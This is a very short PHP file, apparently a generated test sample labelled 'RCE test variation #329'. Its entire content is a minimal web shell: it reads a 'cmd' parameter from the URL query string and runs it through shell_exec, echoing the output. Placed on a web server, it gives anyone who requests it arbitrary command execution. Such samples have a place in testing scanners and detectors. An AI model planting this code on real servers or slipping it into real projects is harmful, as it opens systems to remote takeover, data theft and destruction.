<?php
// RCE test variation #329
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>